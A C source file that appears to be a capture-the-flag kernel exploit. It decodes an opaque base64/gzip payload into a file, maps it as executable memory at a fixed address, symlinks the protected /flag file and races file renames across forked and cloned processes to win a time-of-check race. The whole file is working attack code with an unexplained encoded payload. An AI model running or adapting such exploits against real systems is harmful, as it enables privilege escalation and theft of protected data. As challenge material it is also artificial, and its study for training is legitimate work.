#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <poll.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include "common.h"  /* kernelinit */

int fd;
char *map = NULL;
volatile char *shared = NULL;
pid_t orig;
char path[0x100];

int test () {
    printf("Hello from cloned process!\n");

    snprintf(path, sizeof(path), "/proc/%d", orig+2);

    while (!shared[0]) {
        sched_yield();
    }
    printf("race!\n");

    for (int i = 0; i < 10000; i++) {
        rename("/home/ctf/b", "/home/ctf/c");
        rename("/home/ctf/a", "/home/ctf/b");
        rename("/home/ctf/c", "/home/ctf/a");
        sched_yield();
    }
    printf("done\n");
    
    return 0;
}

int test2 () {
    printf("Hello from thread 1!\n");
    void (*loop)(void);
    loop = (void*) 0x601004;
    loop();
    return 0;
}

int main () {
    pin_cpu(0);
    setbuf(stdout, NULL);

    unlink("/home/ctf/x");
    unlink("/home/ctf/a");
    unlink("/home/ctf/b");
    system("echo H4sIAAAAAAAAA6t39XFjYmRkgAEmBjsGCC8BTDpAxRME4UqAYhZAdQ4MnAwcYLWsIEEBmGwCCl0D5cFomDqQPjYg3sBAJBAgrGQUjIJRMApGwSgYBaNgFIyCUTAKRsEoGAXYwWd+uV+v/+17LwLlM1YFMTBWCDBK87BzTGCEdLtlgPjG////OZD0sTBA5EB9f3e/UAYmBoYDIDFmJHkRKB8kLzbBovHCmk6FZblXksRL/p4WqbrS6e7sbKWgEZpUmldSqmBorGesZ6BrVgrmGtUZmegZmGhChXG7nxFs18f/6OIC/AwMQmDZBDAf7vaS1OISvWSG+OKSxKISBga94srcksQkIF1SBKEzYKyS1IoSBr3UjPi0osTcVAa9vPySVL30vFK9gqL8gtSikkokoaTSzJwU3cwUBr3k/Nzc1LwScuICG5BmQIyVQEAC1IMMqP5iQBGGA0WofiYGmHqIfg6oQh009ejmaQMxO5J+C6h+C6h+BQL67dD0R0D1R0D1q6CpZ0HjB0Ldj54EagQQ7kMGjFhoJgZMsAKq3wPKh7kR5n4JKM3JgEjTyOADVD8/DvthQBCH/v9Q/VEE9AMA+aZeN6ATAAA= | base64 -d | gunzip > /home/ctf/x");
    system("echo -en 12345678 > /home/ctf/a");
    symlink("/flag", "/home/ctf/b");
    

    char *buf1, *buf2;
    int fd1 = open("/home/ctf/x", O_RDWR);
    buf1 = SYSCHK(mmap((void*)0x600000, 0x2000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_SHARED|MAP_FIXED, fd1, 0));
    int foo = buf1[0];
    int fd2 = open("/home/ctf/a", O_RDWR);
    buf2 = SYSCHK(mmap((void*)0x602000, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED, fd2, 0));
    buf2[0] = 'a';

    int fdmaps = open("/proc/self/maps", O_RDONLY);
    char buf0[0x1000];
    write(1, buf0, SYSCHK(read(fdmaps, buf0, sizeof(buf0))));
    close(fdmaps);

    orig = getpid();
    shared = SYSCHK(mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANON, -1, 0));
    
    if (fork() == 0) {
        test();
        exit(0);
    }
    
    SYSCHK(clone(&test2, malloc(0x20000)+0x1f000, CLONE_VM|CLONE_FILES|CLONE_THREAD|CLONE_SIGHAND, NULL, NULL, NULL, NULL));
    
    set_priority(0, 19);
    burn_cpu_time(1000000 * 2);

    shared[0] = 0x1;

    void (*die)(void);
    die = (void*) 0x602000;
    die();

    return 0;
}
